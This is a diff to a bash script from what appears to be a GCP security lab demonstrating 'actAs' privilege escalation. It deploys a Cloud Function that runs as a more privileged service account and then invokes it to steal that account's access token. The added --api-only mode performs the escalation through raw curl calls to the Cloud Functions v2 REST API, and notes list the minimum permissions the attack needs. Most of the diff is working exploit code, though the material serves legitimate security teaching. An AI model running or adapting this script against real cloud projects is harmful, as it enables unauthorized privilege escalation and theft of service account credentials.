@@ -11,12 +11,25 @@
 # directly against Google REST APIs (never re-impersonating via gcloud) to
 # prove it now holds target_sa's roles/editor project permissions.
 #
+# Modes:
+#   Default (gcloud): uses gcloud functions deploy — clearer, pedagogically
+#     closer to what an attacker would run. Requires extra gcloud-mechanic
+#     permissions beyond the raw API minimum:
+#       cloudbuild.builds.get            — Cloud Build GetDefaultServiceAccount preflight
+#       resourcemanager.projects.getIamPolicy — project IAM policy validation
+#       run.services.getIamPolicy        — Cloud Run IAM read post-deploy
+#       run.services.setIamPolicy        — Cloud Run IAM set (--no-allow-unauthenticated)
+#     These are included in starting_sa's custom role by Terraform.
+#
+#   --api-only: uses the raw Cloud Functions v2 REST API via curl. Requires
+#     only the true minimum permissions (functions.create + sourceCodeSet +
+#     actAs) — no Cloud Build or IAM policy lookup. Demonstrates the exact
+#     minimal permission surface of the attack.
+#
 # Credential model (no static SA keys):
 #   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
-#   Demo commands pass --impersonate-service-account=starting_sa to run as it.
-#   The exploit deploys/invokes a Cloud Function running AS target_sa and steals
-#   its access token from the function's own metadata server — this is the
-#   actual privilege boundary being crossed, not a gcloud impersonation chain.
+#   Both modes impersonate starting_sa via --impersonate-service-account or
+#   gcloud auth print-access-token respectively.
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -26,6 +39,15 @@ NC='\033[0m'
 DIM='\033[2m'
 
 ATTACK_COMMANDS=()
+USE_GCLOUD=true
+
+# Parse flags
+for arg in "$@"; do
+    case "$arg" in
+        --api-only) USE_GCLOUD=false ;;
+        *) echo -e "${RED}Unknown flag: $arg${NC}"; echo "Usage: $0 [--api-only]"; exit 1 ;;
+    esac
+done
 
 show_cmd() {
     local identity="$1"; shift
@@ -47,6 +69,11 @@ show_illustrative_cmd() {
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}GCP-CLOUDFUNCTIONS-001: Cloud Function actAs Privilege Escalation Demo${NC}"
+if $USE_GCLOUD; then
+    echo -e "${GREEN}Mode: gcloud (default)${NC}"
+else
+    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
+fi
 echo -e "${GREEN}========================================${NC}\n"
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -114,7 +141,6 @@ echo -e "${GREEN}✓ Propagation wait complete${NC}\n"
 # re-running the demo after a failed cleanup simply updates the same function
 # in place rather than accumulating orphaned resources.
 FUNCTION_NAME="pl-cf001-exfil-${RESOURCE_SUFFIX}"
-OBJECT_NAME="${FUNCTION_NAME}.zip"
 ENTRY_POINT="exfiltrate_token"
 
 # Step 2: Verify starting SA has no project role of its own
@@ -172,47 +198,152 @@ REQEOF
 
 echo -e "${GREEN}✓ Built malicious function source (entry point: $ENTRY_POINT)${NC}\n"
 
-# Step 4: [EXPLOIT] Deploy the function to run AS target_sa. This is the
-# actual privilege escalation action: starting_sa's iam.serviceAccounts.actAs
-# grant on target_sa is what lets --service-account=target_sa succeed at all.
+# Step 4: [EXPLOIT] Deploy the function to run AS target_sa.
+# This is the actual privilege escalation action: starting_sa's
+# iam.serviceAccounts.actAs grant on target_sa is what lets
+# --service-account=target_sa succeed at all.
 #
-# --source points to the local source directory — gcloud generates a presigned
-# upload URL via cloudfunctions.functions.sourceCodeSet and uploads through it,
-# so starting_sa needs no GCS IAM permissions at all.
+# gcloud mode: uses gcloud functions deploy — clear, shows the exact commands
+# an attacker would run. Requires cloudbuild.builds.get,
+# resourcemanager.projects.getIamPolicy, run.services.getIamPolicy, and
+# run.services.setIamPolicy in addition to the raw API minimums.
 #
-# --build-service-account pins the Cloud Build job to target_sa (already
-# actAs'd), rather than defaulting to the Compute Engine default SA which
-# would require a separate actAs grant on an unrelated shared account.
+# --api-only mode: uses the Cloud Functions v2 REST API directly via curl.
+# Requires only functions.create + sourceCodeSet + actAs — no Cloud Build or
+# IAM policy reads.
 echo -e "${YELLOW}Step 4: [EXPLOIT] Deploying malicious Cloud Function to run as target SA${NC}"
-show_attack_cmd "$STARTING_SA_EMAIL" \
-    "gcloud functions deploy $FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --no-allow-unauthenticated --impersonate-service-account=$STARTING_SA_EMAIL"
 
-EXISTING_FUNCTION=$(gcloud functions describe "$FUNCTION_NAME" \
-    --gen2 --region="$REGION" --project="$PROJECT_ID" \
-    --impersonate-service-account="$STARTING_SA_EMAIL" \
-    --format="value(state)" 2>/dev/null || true)
+if $USE_GCLOUD; then
+    # gcloud mode — the attacker's natural first choice
+    show_attack_cmd "$STARTING_SA_EMAIL" \
+        "gcloud functions deploy $FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --no-allow-unauthenticated --impersonate-service-account=$STARTING_SA_EMAIL"
 
-if [ -n "$EXISTING_FUNCTION" ]; then
-    echo -e "${YELLOW}Note: function $FUNCTION_NAME already exists (state: $EXISTING_FUNCTION).${NC}"
-    echo -e "${YELLOW}Reusing it — run cleanup_attack.sh first to start fresh.${NC}"
-    echo -e "${GREEN}✓ Using existing function $FUNCTION_NAME${NC}\n"
-elif ! gcloud functions deploy "$FUNCTION_NAME" \
-        --gen2 \
-        --runtime=python312 \
-        --region="$REGION" \
-        --source="$BUILD_DIR/src" \
-        --entry-point="$ENTRY_POINT" \
-        --trigger-http \
-        --service-account="$TARGET_SA_EMAIL" \
-        --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
-        --no-allow-unauthenticated \
+    EXISTING_FUNCTION=$(gcloud functions describe "$FUNCTION_NAME" \
+        --gen2 --region="$REGION" --project="$PROJECT_ID" \
         --impersonate-service-account="$STARTING_SA_EMAIL" \
-        --quiet 2>/dev/null; then
-    echo -e "${RED}✗ Failed to deploy function $FUNCTION_NAME as $TARGET_SA_EMAIL${NC}"
-    echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa and"
-    echo "cloudfunctions.functions.create/.sourceCodeSet at the project level"
-    exit 1
+        --format="value(state)" 2>/dev/null || true)
+
+    if [ -n "$EXISTING_FUNCTION" ]; then
+        echo -e "${YELLOW}Note: function $FUNCTION_NAME already exists (state: $EXISTING_FUNCTION).${NC}"
+        echo -e "${YELLOW}Reusing it — run cleanup_attack.sh first to start fresh.${NC}"
+        echo -e "${GREEN}✓ Using existing function $FUNCTION_NAME${NC}\n"
+    elif ! gcloud functions deploy "$FUNCTION_NAME" \
+            --gen2 \
+            --runtime=python312 \
+            --region="$REGION" \
+            --source="$BUILD_DIR/src" \
+            --entry-point="$ENTRY_POINT" \
+            --trigger-http \
+            --service-account="$TARGET_SA_EMAIL" \
+            --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
+            --no-allow-unauthenticated \
+            --impersonate-service-account="$STARTING_SA_EMAIL" \
+            --quiet 2>/dev/null; then
+        echo -e "${RED}✗ gcloud functions deploy failed${NC}"
+        echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa,"
+        echo "cloudfunctions.functions.create, .sourceCodeSet, cloudbuild.builds.get,"
+        echo "resourcemanager.projects.getIamPolicy, run.services.getIamPolicy,"
+        echo "and run.services.setIamPolicy"
+        echo ""
+        echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
+        exit 1
+    else
+        echo -e "${GREEN}✓ Deployed $FUNCTION_NAME running as $TARGET_SA_EMAIL${NC}\n"
+    fi
+
 else
+    # --api-only mode — minimal permissions, raw REST API
+    ACCESS_TOKEN=$(gcloud auth print-access-token \
+        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
+    if [ -z "$ACCESS_TOKEN" ]; then
+        echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
+        exit 1
+    fi
+
+    # (a) Get a signed GCS upload URL (requires cloudfunctions.functions.sourceCodeSet)
+    show_attack_cmd "$STARTING_SA_EMAIL" \
+        "curl -X POST https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions:generateUploadUrl (cloudfunctions.functions.sourceCodeSet)"
+
+    UPLOAD_RESPONSE=$(curl -s -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{}' \
+        "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions:generateUploadUrl")
+    UPLOAD_URL=$(echo "$UPLOAD_RESPONSE" | jq -r '.uploadUrl // empty')
+    UPLOAD_BUCKET=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.bucket // empty')
+    UPLOAD_OBJ=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.object // empty')
+
+    if [ -z "$UPLOAD_URL" ] || [ -z "$UPLOAD_BUCKET" ]; then
+        echo -e "${RED}✗ generateUploadUrl failed${NC}"
+        echo "Response: $UPLOAD_RESPONSE"
+        exit 1
+    fi
+
+    # (b) Upload the zip to the signed URL (no IAM permission required — signed URL)
+    (cd "$BUILD_DIR/src" && zip -qr "$BUILD_DIR/src.zip" .)
+    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
+        -H "Content-Type: application/zip" \
+        --data-binary "@$BUILD_DIR/src.zip" \
+        "$UPLOAD_URL")
+    if [ "$HTTP_CODE" != "200" ]; then
+        echo -e "${RED}✗ Source upload failed (HTTP $HTTP_CODE)${NC}"
+        exit 1
+    fi
+
+    # (c) Create the function — requires cloudfunctions.functions.create + actAs on target_sa
+    show_attack_cmd "$STARTING_SA_EMAIL" \
+        "curl -X POST https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions?functionId=$FUNCTION_NAME (cloudfunctions.functions.create + iam.serviceAccounts.actAs)"
+
+    CREATE_RESPONSE=$(curl -s -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions?functionId=${FUNCTION_NAME}" \
+        -d "{
+          \"buildConfig\": {
+            \"runtime\": \"python312\",
+            \"entryPoint\": \"${ENTRY_POINT}\",
+            \"source\": {
+              \"storageSource\": {
+                \"bucket\": \"${UPLOAD_BUCKET}\",
+                \"object\": \"${UPLOAD_OBJ}\"
+              }
+            },
+            \"serviceAccount\": \"projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}\"
+          },
+          \"serviceConfig\": {
+            \"serviceAccountEmail\": \"${TARGET_SA_EMAIL}\",
+            \"ingressSettings\": \"ALLOW_ALL\",
+            \"maxInstanceCount\": 1,
+            \"availableMemory\": \"128Mi\",
+            \"timeoutSeconds\": 60
+          }
+        }")
+
+    OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name // empty')
+    CREATE_ERROR=$(echo "$CREATE_RESPONSE" | jq -r '.error.message // empty')
+    if [ -z "$OPERATION_NAME" ] || [ -n "$CREATE_ERROR" ]; then
+        echo -e "${RED}✗ Function create failed${NC}"
+        echo "Response: $CREATE_RESPONSE"
+        exit 1
+    fi
+
+    # Poll until ACTIVE
+    echo "Waiting for function deployment to complete..."
+    for i in $(seq 1 30); do
+        sleep 10
+        FUNC_STATE=$(gcloud functions describe "$FUNCTION_NAME" \
+            --gen2 --region="$REGION" --project="$PROJECT_ID" \
+            --format="value(state)" \
+            --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
+        if [ "$FUNC_STATE" = "ACTIVE" ]; then
+            break
+        fi
+        if [ "$i" -eq 30 ]; then
+            echo -e "${RED}✗ Function did not become ACTIVE after 300s${NC}"
+            exit 1
+        fi
+    done
+
     echo -e "${GREEN}✓ Deployed $FUNCTION_NAME running as $TARGET_SA_EMAIL${NC}\n"
 fi
 
@@ -229,6 +360,7 @@ echo -e "${YELLOW}Step 5: [EXPLOIT] Invoking the function to trigger token exfil
 FUNCTION_URL=$(gcloud functions describe "$FUNCTION_NAME" \
     --gen2 \
     --region="$REGION" \
+    --project="$PROJECT_ID" \
     --impersonate-service-account="$STARTING_SA_EMAIL" \
     --format="value(serviceConfig.uri)" 2>/dev/null)
 
@@ -254,7 +386,7 @@ FUNCTION_BODY=$(curl -sS -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL" 2>
 
 if [ -z "$FUNCTION_BODY" ]; then
     echo -e "${RED}✗ Failed to invoke function or empty response${NC}"
-    echo "Check that starting_sa holds cloudfunctions.functions.invoke at the project level"
+    echo "Check that starting_sa holds run.routes.invoke at the project level"
     exit 1
 fi
 
@@ -366,6 +498,24 @@ if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     for cmd in "${ATTACK_COMMANDS[@]}"; do
         echo -e "  ${CYAN}\$ ${cmd}${NC}"
     done
+fi
+
+if $USE_GCLOUD; then
+    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
+    echo "  This demo used 'gcloud functions deploy', which is the natural tool for this"
+    echo "  attack and shows the clearest command sequence. However, gcloud makes extra"
+    echo "  preflight calls that require permissions beyond the attack's true minimum:"
+    echo ""
+    echo "    cloudbuild.builds.get           — gcloud queries Cloud Build's"
+    echo "                                      GetDefaultServiceAccount endpoint"
+    echo "    resourcemanager.projects.getIamPolicy — gcloud validates the project IAM policy"
+    echo "    run.services.getIamPolicy       — gcloud reads Cloud Run IAM post-deploy"
+    echo "    run.services.setIamPolicy       — gcloud sets Cloud Run IAM for"
+    echo "                                      --no-allow-unauthenticated"
+    echo ""
+    echo "  These are included in starting_sa's role by Terraform (labeled as gcloud mechanics)."
+    echo "  To see the attack with only the true minimum permissions, run:"
+    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
 fi
 
 echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
